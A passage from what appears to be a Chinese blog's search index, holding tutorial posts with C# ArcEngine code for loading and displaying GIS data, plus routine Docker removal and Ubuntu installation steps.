pExtentStack;private void PreViewTSButton_Click(object sender, EventArgs e)&#123; pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到前一视图，第一个视图没有前视图 if (pExtentStack.CanUndo()) &#123; pExtentStack.Undo(); //撤销到上一视图范围 NextViewTSButton.Enabled = true; //后一视图可以使用 if (!pExtentStack.CanUndo()) &#123; PreViewTSButton.Enabled = false; //前一视图不能使用 &#125; &#125; mainMapControl.ActiveView.Refresh();&#125; 下一视图12345678910111213141516private void NextViewTSButton_Click(object sender, EventArgs e)&#123; pExtentStack = mainMapControl.ActiveView.ExtentStack; //判断是否可以回到后一视图，最后一个视图没有后一视图 if (pExtentStack.CanRedo()) //如果可以重做下一视图 &#123; pExtentStack.Redo(); //重做到下一视图 PreViewTSButton.Enabled = true; //上一视图按钮可以使用 if (!pExtentStack.CanRedo()) //如果不可以重做下一视图 &#123; NextViewTSButton.Enabled = false; //下一视图不能用 &#125; &#125; mainMapControl.ActiveView.Refresh();&#125;]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine加载数据]]></title>
    <url>%2FArcgisEngine%20%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[加载shapefile数据F1 使用AddShapefile方法1234567891011121314151617181920212223242526272829303132333435private void 添加ShapefileToolStripMenuItem_Click(object sender, EventArgs e) &#123; try &#123; //同样实例化一个打开文件的类对象 OpenFileDialog open = new OpenFileDialog(); // 如果打开正确 if (open.ShowDialog() == DialogResult.OK) &#123; //首先定义一个空的路径 string filePath = string.Empty; // 然后定义一个空的文件名 string file = string.Empty; // 获取完整的文件路径 string filedir = open.FileName; //如果路径为空，嘛都不返回 if (fileDir == &quot;&quot;) return; // 对完整路径进行截取 获取最后一个斜杠的索引 int pos = filedir.LastIndexOf(&apos;\\&apos;); // 截取字符串 路径 filePath =filedir.Substring(0, pos); //文件名 file = filedir.Substring(pos+1); // 需要两个参数 axMapControl1.AddShapeFile(filePath, file); //刷新 axMapControl1.ActiveView.Refresh(); &#125; &#125; catch (Exception) &#123; MessageBox.Show(&quot;请打开正确的文档!&quot;, &quot;提醒&quot;,MessageBoxButtons.OK, MessageBoxIcon.Error ); &#125; &#125; F2 使用工作空间思路: 创建ShapefileWorkspaceFactory实例，使用OpenFromFile方法打开工作区。 创建FeatureLayer的实例，定义数据集。 使用AddLayer方法加载数据。 123using ESRI.ArcGIS.Geodatabase;using ESRI.ArcGIS.DataSourcesFile;using ESRI.ArcGIS.DataSourcesRaster; 1234567891011121314151617181920212223242526272829303132OpenFileDialog open = new OpenFileDialog();open.CheckFileExists = true;open.Title = &quot;打开Shape文件&quot;;open.RestoreDirectory = true;open.Filter = &quot;Shape文件(*.shp)|**.shp&quot;;open.RestoreDirectory = true;open.ShowDialog();//获取完整的文件路径 :path+namestring fileDir = open.FileName;//路径为空不返回if (fileDir == &quot;&quot;) return;// 对完整路径进行截取 int pos = fileDir.LastIndexOf(&quot;\\&quot;);// 路径string pfilePath = fileDir.Substring(0, pos);//文件名string file = fileDir.Substring(pos + 1);//实例化ShapefileWorkspaceFactory工作空间，打开Shape文件IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass();//强制转换 打开路径IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace;//创建并实例化要素类IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file);IFeatureLayer pFeatureLayer = new FeatureLayerClass();pFeatureLayer.Name = pFeatureClass.AliasName;pFeatureLayer.FeatureClass = pFeatureClass;mainMapControl.Map.AddLayer(pFeatureLayer);mainMapControl.ActiveView.Refresh();mainTOCControl.SetBuddyControl(mainMapControl); 加载栅格数据主要用到以下2个接口： IRasterPyramid3接口提供对栅格数据集的金字塔属性的访问 Present属性–判断栅格数据集是否存在金字塔 Create方法–为栅格数据集创建金字塔 IRasterLayer接口继承自ILayer接口 CreateFromDataset方法–从已有的栅格数据集对象创建图层 CreateFromRaster方法–从已有的栅格对象创建图层 Raster属性–获取IRasterLayer接口中的Raster对象 DisplayResolutionFactor属性–设置栅格数据的分辨率 12341.直接用IRasterLayer接口打开一个栅格文件并加载到地图控件IRasterLayer rasterLayer = new RasterLayerClass();rasterLayer.CreateFromFilePath(fileName); // fileName指存本地的栅格文件路径axMapControl1.AddLayer(rasterLayer, 0); 2.思路: (1)使用OpenFromFile方法获得栅格文件的工作区 (2)使用OpenRasterDataset方法获得栅格文件的数据集 (3)判断栅格数据集是否具有金字塔 (4)创建pRasterLayer，并定义数据集 (5)使用AddLayer方法加载数据1234567891011121314151617181920212223242526272829303132333435OpenFileDialog pOpenFileDialog = new OpenFileDialog();pOpenFileDialog.CheckFileExists = true;pOpenFileDialog.Title = &quot;加载栅格数据&quot;;pOpenFileDialog.Filter = &quot;栅格文件(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img&quot;;pOpenFileDialog.ShowDialog();//获取名字string pRasterFilename = pOpenFileDialog.FileName;if (pRasterFilename == &quot;&quot;) return;// IO里面获取文件名字与路径的固定用法string pPath = System.IO.Path.GetDirectoryName(pRasterFilename);string pFileName = System.IO.Path.GetFileName(pRasterFilename);IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory();IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0);IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace;IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName);//影像金字塔的判断与创建IRasterPyramid3 pRasPyramid;pRasPyramid = pRasterDataset as IRasterPyramid3;if (pRasPyramid != null)&#123; if (!(pRasPyramid.Present)) &#123; //创建金字塔 pRasPyramid.Create(); &#125;&#125;IRaster pRaster;pRaster = pRasterDataset.CreateDefaultRaster();IRasterLayer pRasterLayer;pRasterLayer = new RasterLayerClass();pRasterLayer.CreateFromRaster(pRaster);ILayer pLayer = pRasterLayer as ILayer;mainMapControl.AddLayer(pLayer, 0); 加载CAD数据1.作为矢量图层加载 === 1)分图层加载123456789101112IWorkspaceFactory pWorkspaceFactory;IFeatureWorkspace pFeatureWorkspace;pWorkspaceFactory = new CadWorkspaceFactory();pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0);//加载CAD文件中的线文件IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + &quot;:polyline&quot;);IFeatureLayer pFeatureLayer = new FeatureLayerClass();pFeatureLayer.Name = pFileName;pFeatureLayer.FeatureClass = pFeatureClass;mainMapControl.Map.AddLayer(pFeatureLayer);mainMapControl.ActiveView.Refresh();mainTOCControl.SetBuddyControl(mainMapControl); 2.作为矢量图层加载 === 1)整幅图加载12345678910111213141516171819202122232425262728293031//打开CAD数据集IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass(); //using ESRI.ArcGIS.DataSourcesFile;IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace;//打开一个要素集IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName);// IFeatureContainer可以管理IFeatureDataset中的每个要素类IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset; //对CAD文件中的要素进行遍历处理for (int i = 0; i &lt; pFeatureContainer.ClassCount; i++)&#123; IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i); //如果是注记， 则添加注记层 if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation) &#123; IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); &#125; else //如果是点线面则添加要素层 &#123; IFeatureLayer pFeatureLayer = new FeatureLayerClass(); pFeatureLayer.Name = pFeatureClass.AliasName; pFeatureLayer.FeatureClass = pFeatureClass; mainMapControl.Map.AddLayer(pFeatureLayer); &#125; mainMapControl.ActiveView.Refresh(); mainTOCControl.SetBuddyControl(mainMapControl);&#125; F3.作为栅格图层加载12345678910111213141516IWorkspaceFactory pWorkspaceFactory;IWorkspace pWorkspace;ICadDrawingDataset pCadDrawingDataset;ICadDrawingWorkspace pCadDrawingWorkspace;ICadLayer pCadLayer;pWorkspaceFactory = new CadWorkspaceFactoryClass();pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0);pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace;//获得CAD文件的数据集pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName);pCadLayer = new CadLayerClass();pCadLayer.CadDrawingDataset = pCadDrawingDataset;mainMapControl.Map.AddLayer(pCadLayer);mainMapControl.ActiveView.Refresh();mainTOCControl.SetBuddyControl(mainMapControl); 加载个人地理数据库12 加载文件地理数据库12]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine初识 -- 打开地图]]></title>
    <url>%2FArcgisEngine%20%E6%89%93%E5%BC%80%E6%96%87%E6%A1%A3%2F</url>
    <content type="text"><![CDATA[一句代码 创建winform程序 必须要添加12341. ```TOCControl```视图控件 =&gt; 属性,设置关联属性绑定(Buddy)到地图控件上1. ```ToolbalControl```工具条控件 伙伴控价 =&gt; 设置关联属性绑定到地图控件上1. ```MapControl```地图控件 也可以设置属性设置默认打开的地图1. 引用```ESRI.ArcGIS.Version 在主程序代码中加入： 123//在窗口加载前添加 绑定产品码// 注意是 program.cs文件 ESRI.ArcGIS.RuntimeManager.Bind(ESRI.ArcGIS.ProductCode.EngineOrDesktop); 才能正常运行 常见的AE控价 PageLayoutControl 布局视图 TOOControl 内容列表 MapControl 数据视图 打开地图文档F1 自己写的12345678910111213141516171819202122232425262728293031323334353637//打开mxd文档 F1 try &#123; //实例化一个对象 OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = "打开地图文档"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = "地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt";|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf"/文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; // 存储打开的文件路径 //判断如果文件正常打开 if (open.ShowDialog() == DialogResult.OK) &#123; // 获取文件路径 path+name string fileName = open.FileName; // 数据窗口加载地图文档 axMapControl1.LoadMxFile(fileName); // 刷新一下页面 axMapControl1.ActiveView.Refresh(); // 伙伴控件可以通过下面的方式来进行绑定 axTOCControl1.SetBuddyControl(axMapControl1); &#125; &#125; catch(Exception) &#123; MessageBox.Show("请打开正确的文档!", "提醒", MessageBoxButtons.OK, MessageBoxIcon.Information); &#125; &#125; F2 使用IMapControl接口的LoadMxFile方法123456789101112131415161718192021222324252627282930313233OpenFileDialog open = new OpenFileDialog();//设置参数//检查文件是否存在open.CheckFileExists = true;open.Title = "打开地图文档";// 不允许多个文件同时打开open.Multiselect = false;// 存储时打开的文件路径open.RestoreDirectory = true;//打开文件格式open.Filter = "地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf";//文件过滤条件open.Multiselect = false;//禁止多选open.RestoreDirectory = true; // 存储打开的文件路径open.ShowDialog();//文件名string fileName = open.FileName;if (fileName == "")&#123; return;&#125;//检查地图文档有效性if (mainMapControl.CheckMxFile(fileName))&#123; mainMapControl.LoadMxFile(fileName); mainMapControl.ActiveView.Refresh();&#125;else&#123; MessageBox.Show(fileName + "是无效的地图文档!", "信息提示"); return;&#125; F3 使用IMapDocument接口123456789101112131415161718192021222324252627// using ESRI.ArcGIS.Carto; OpenFileDialog open = new OpenFileDialog(); //设置参数 //检查文件是否存在 open.CheckFileExists = true; open.Title = "打开地图文档"; // 不允许多个文件同时打开 open.Multiselect = false; // 存储时打开的文件路径 open.RestoreDirectory = true; //打开文件格式 open.Filter = @"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf";//文件过滤条件 open.Multiselect = false;//禁止多选 open.RestoreDirectory = true; //打开窗口 open.ShowDialog(); // 存储打开的文件路径 string fileName = open.FileName; if (mainMapControl.CheckMxFile(fileName)) &#123; //将数据载入pMapDocument并与Map控件关联 IMapDocument pMapDocument = new MapDocument(); // using ESRI.ArcGIS.Carto; pMapDocument.Open(fileName, ""); //获取Map地图中激活的地图文档 mainMapControl.Map = pMapDocument.ActiveView.FocusMap; mainMapControl.ActiveView.Refresh(); &#125; F4 使用ControlsOpenDocCommandClass类库资源 =》 适合比赛用12345//using ESRI.ArcGIS.Controls; ICommand command = new ControlsOpenDocCommandClass(); //using ESRI.ArcGIS.Controls; command.OnCreate(mainMapControl.Object); command.OnClick(); mainTOCControl.SetBuddyControl(mainMapControl); 待改进之处： 窗口的大小以及出现的位置，美化 Form的name随着文档的名字改变]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine同步数据视图与布局视图]]></title>
    <url>%2FArcgisEngine%20%E6%95%B0%E6%8D%AE%E8%A7%86%E5%9B%BE%E4%B8%8E%E5%B8%83%E5%B1%80%E8%A7%86%E5%9B%BE%E7%9A%84%E5%90%8C%E6%AD%A5%2F</url>
    <content type="text"><![CDATA[12345678910// 数据视图与布局视图同步private void mainMapControl_OnAfterScreenDraw(object sender, IMapControlEvents2_OnAfterScreenDrawEvent e)&#123; IActiveView pActiveView = (IActiveView)mainPageLayoutControl1.ActiveView.FocusMap; IDisplayTransformation displayTransformation = pActiveView.ScreenDisplay.DisplayTransformation; displayTransformation.VisibleBounds = mainMapControl.Extent; mainPageLayoutControl1.ActiveView.Refresh(); CopyToPageLayout(); // 调用下面的函数&#125; 1234567891011// CopyToPageLayout() 布局视图与数据视图同步private void CopyToPageLayout()&#123; IObjectCopy pObjectCopy = new ObjectCopyClass(); object copyFromMap = mainMapControl.Map; object copiedMap = pObjectCopy.Copy(copyFromMap); // 复制地图到copiedMap中 object copyToMap = mainPageLayoutControl1.ActiveView.FocusMap; pObjectCopy.Overwrite(copiedMap, ref copyToMap); // 复制地图 mainPageLayoutControl1.ActiveView.Refresh();&#125;]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine"万能""加载数据方法]]></title>
    <url>%2FArcgisEngine%20%E4%B8%87%E8%83%BD%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[下面介绍一种“万能”加载数据的办法： 12345// 加载很多种数据ICommand command = new ControlsAddDataCommandClass();command.OnCreate(mainMapControl.Object);command.OnClick();mainMapControl.ActiveView.Refresh();]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker删除镜像和容器]]></title>
    <url>%2Fdocker%E5%88%A0%E9%99%A4%E6%9F%90image%2F</url>
    <content type="text"><![CDATA[先查看容器运行状态 1docker ps -a 找到image对应的容器，先stop12# iddocker stop d751d48a6d0a 再删除容器1docker rm d751d48a6d0a 最后才能删除镜像12345docker rmi fce289e99eb9# 查看镜像，删除okdocker images 注：rm与rmi的区别12rm Remove one or more containersrmi Remove one or more images]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker安装]]></title>
    <url>%2Fdocker%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[docker：有两个版本:docker-ce(社区版)和docker-ee(企业版)。 笔者这里介绍安装或升级的是最新版docker-ce(社区版)。 参考官网地址：https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#os-requirements docker-compse：可运行和管理多个docker容器。 docker-machine：docker官方提供的docker管理工具。可管理多个docker主机，可搭建swarm集群。 一、docker安装1，卸载旧版本docker 全新安装时，无需执行该步骤 1$ sudo apt-get remove docker docker-engine docker.io 2，更新系统软件 1$ sudo apt-get update 3，安装依赖包 12345$ sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 4，添加官方密钥 执行该命令时，如遇到长时间没有响应说明网络连接不到docker网站，需要使用代-理进行。 1$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 显示OK,表示添加成功. 5，添加仓库 1234$ sudo add-apt-repository \ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 6，再次更新软件 经实践，这一步不能够省略，我们需要再次把软件更新到最新，否则下一步有可能会报错。 1$ sudo apt-get update 7，安装docker 如果想指定安装某一版本，可使用 sudo apt-get install docker-ce= 命令，把替换为具体版本即可。 以下命令没有指定版本，默认就会安装最新版 1$ sudo apt-get install docker-ce 8，查看docker版本 1$ docker -v 显示“Docker version 17.09.0-ce, build afdb6d4”字样，表示安装成功。 二、docker-compose安装1，下载docker-compose 1$ sudo curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose 2，授权 1$ sudo chmod +x /usr/local/bin/docker-compose 3，查看版本信息 1$ docker-compose --version 显示出版本信息，即安装成功。 三、docker-machine安装说明：docker-machine的使用是要基于virtualBox的。如果没有安装安装过，请先安装virtualBox。 1，安装virtualBox 登录virtualBox官网：https://www.virtualbox.org/wiki/Linux_Downloads 找到”Ubuntu 16.04 (“Xenial”) i386 | AMD64”字样，点击“AMD64”进行下载。 下载后，执行以下命令进行安装： 1$ sudo dpkg -i virtualbox-5.2_5.2.0-118431_Ubuntu_xenial_amd64.deb 2，下载并安装docker-machine 123$ curl -L https://github.com/docker/machine/releases/download/v0.13.0/docker-machine-`uname -s`-`uname -m` &gt;/tmp/docker-machine &amp;&amp;chmod +x /tmp/docker-machine &amp;&amp;sudo cp /tmp/docker-machine /usr/local/bin/docker-machine 3，查看版本信息 1$ docker-machine version 显示出版本信息，即安装成功。]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
